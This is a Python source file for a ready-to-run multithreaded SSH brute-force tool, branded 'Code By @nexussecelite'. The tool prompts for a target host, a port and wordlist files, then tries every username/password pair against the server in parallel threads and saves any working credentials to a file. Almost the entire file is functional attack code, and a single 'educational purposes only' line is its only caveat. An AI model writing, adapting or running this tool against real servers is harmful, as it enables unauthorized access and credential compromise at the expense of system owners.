import os
import itertools
import logging
import threading
import queue
import signal
import sys
import paramiko
from tqdm import tqdm
from cryptography.fernet import Fernet
from colorama import Fore, Style, init
from datetime import datetime
import getpass

# Initialize colorama
init(autoreset=True)

# Configuration
FERNET_KEY = Fernet.generate_key()
cipher_suite = Fernet(FERNET_KEY)

# Configure logging
logging.basicConfig(filename='advanced_tool.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

# Initialize shared resources
PASSWORD_QUEUE = queue.Queue()
STOP_EVENT = threading.Event()
SUCCESS = False
FOUND_CREDENTIALS = None

def encrypt_message(message):
    """Encrypt a message using Fernet encryption."""
    return cipher_suite.encrypt(message.encode()).decode()

def decrypt_message(encrypted_message):
    """Decrypt a message using Fernet encryption."""
    return cipher_suite.decrypt(encrypted_message.encode()).decode()

def clear_console():
    """Clear console screen for a cleaner interface."""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Prints the advanced banner for the security tool."""
    banner = f"""
    {Fore.RED}{Style.BRIGHT}
███████╗███████╗██╗  ██╗    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██╔════╝██╔════╝██║  ██║    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
███████╗███████╗███████║    ██████╔╝██████╔╝██║   ██║   ██║   █████╗  
╚════██║╚════██║██╔══██║    ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
███████║███████║██║  ██║    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
╚══════╝╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
                                              Code By @nexussecelite                        
    {Style.RESET_ALL}
    {Fore.YELLOW}{Style.BRIGHT}Advanced SSH Brute Force Tool{Style.RESET_ALL}
    """
    print(banner)

def ssh_brute_force(host, username, password, port):
    """Attempts SSH connection using provided credentials."""
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(host, username=username, password=password, port=port, timeout=5)
        ssh_client.close()
        logger.info(f'Successfully connected to {host} with username: {username}, password: {password}')
        print(f'{Fore.GREEN}[+] Connected to {host} with username: {username}, password: {password}{Style.RESET_ALL}')
        return True
    except paramiko.ssh_exception.AuthenticationException:
        return False
    except Exception as e:
        logger.error(f'Error connecting to {host}: {e}')
        return False

def generate_credentials(user_list, password_list_path):
    """Generates (username, password) pairs from given files."""
    try:
        passwords = []
        if os.path.isfile(password_list_path):
            with open(password_list_path, "r") as password_file:
                passwords = [password.strip() for password in password_file]
        else:
            print(f"{Fore.RED}[!] Password list file not found: {password_list_path}{Style.RESET_ALL}")
            sys.exit(1)
            
        for user in user_list:
            for password in passwords:
                PASSWORD_QUEUE.put((user, password))
    except Exception as e:
        print(f"{Fore.RED}[!] Error generating credentials: {e}{Style.RESET_ALL}")
        logger.error(f'Error generating credentials: {e}')
        sys.exit(1)

def brute_force_worker(host, port, progress_bar):
    """Worker function for parallel brute force attacks."""
    global SUCCESS, FOUND_CREDENTIALS
    while not STOP_EVENT.is_set() and not PASSWORD_QUEUE.empty():
        username, password = PASSWORD_QUEUE.get()
        if ssh_brute_force(host, username, password, port):
            STOP_EVENT.set()
            SUCCESS = True
            FOUND_CREDENTIALS = (username, password)
            break
        PASSWORD_QUEUE.task_done()
        progress_bar.update(1)

def signal_handler(signal, frame):
    """Handler for Ctrl+C signal."""
    print(f"\n{Fore.RED}Brute force attack interrupted by user.{Style.RESET_ALL}")
    STOP_EVENT.set()
    sys.exit(0)

def main():
    """Main function to orchestrate the brute force attack."""
    clear_console()
    print_banner()
    print(f"{Fore.MAGENTA}This tool is for educational purposes only. Unauthorized access is illegal.{Style.RESET_ALL}\n")

    host = input(f"{Fore.CYAN}Enter the target Host IP: {Style.RESET_ALL}").strip()
    port = int(input(f"{Fore.CYAN}Enter the port (default 22 for SSH): {Style.RESET_ALL}").strip() or 22)
    num_threads = int(input(f"{Fore.CYAN}Enter the number of threads to use (default 10): {Style.RESET_ALL}").strip() or 10)
    
    # Ask for username input method
    user_input_method = input(f"{Fore.CYAN}Enter 'single' for a single username or 'multi' for a list of usernames: {Style.RESET_ALL}").strip().lower()
    if user_input_method == 'single':
        username = input(f"{Fore.CYAN}Enter the username: {Style.RESET_ALL}").strip()
        user_list = [username]
    elif user_input_method == 'multi':
        user_list_path = input(f"{Fore.CYAN}Enter the path to the username list file: {Style.RESET_ALL}").strip()
        if os.path.isfile(user_list_path):
            with open(user_list_path, "r") as user_list_file:
                user_list = [user.strip() for user in user_list_file]
        else:
            print(f"{Fore.RED}Username list file not found: {user_list_path}{Style.RESET_ALL}")
            sys.exit(1)
    else:
        print(f"{Fore.RED}Invalid input method. Please enter 'single' or 'multi'.{Style.RESET_ALL}")
        sys.exit(1)
    
    password_list_path = input(f"{Fore.CYAN}Enter the path to the password list file: {Style.RESET_ALL}").strip()

    # Register signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    # Loading spinner during credential generation
    print(f"{Fore.YELLOW}Generating credentials...{Style.RESET_ALL}")
    generate_credentials(user_list, password_list_path)
    total_credentials = PASSWORD_QUEUE.qsize()
    print(f"{Fore.GREEN}[+] Credentials generated: {total_credentials}{Style.RESET_ALL}")

    # Starting worker threads with a progress bar
    threads = []
    progress_bar = tqdm(total=total_credentials, desc=f"Attempting passwords on {host}", ncols=100, leave=True)
    for _ in range(num_threads):
        thread = threading.Thread(target=brute_force_worker, args=(host, port, progress_bar))
        thread.start()
        threads.append(thread)
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    
    progress_bar.close()

    if SUCCESS and FOUND_CREDENTIALS:
        username, password = FOUND_CREDENTIALS
        print(f"{Fore.GREEN}[+] Brute force attack successful on {host}. Credentials found.{Style.RESET_ALL}")
        # Save results automatically
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_filename = f"results_{host}_{timestamp}.txt"
        with open(output_filename, 'w') as f:
            f.write(f"Host: {host}\n")
            f.write(f"Port: {port}\n")
            f.write(f"Username: {username}\n")
            f.write(f"Password: {password}\n")
        print(f"{Fore.GREEN}[+] Results saved to: {output_filename}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] Brute force attack failed on {host}. No valid credentials found.{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        clear_console()
        print(f"{Fore.RED}User Exited Forcefully{Style.RESET_ALL}")
        sys.exit(0)
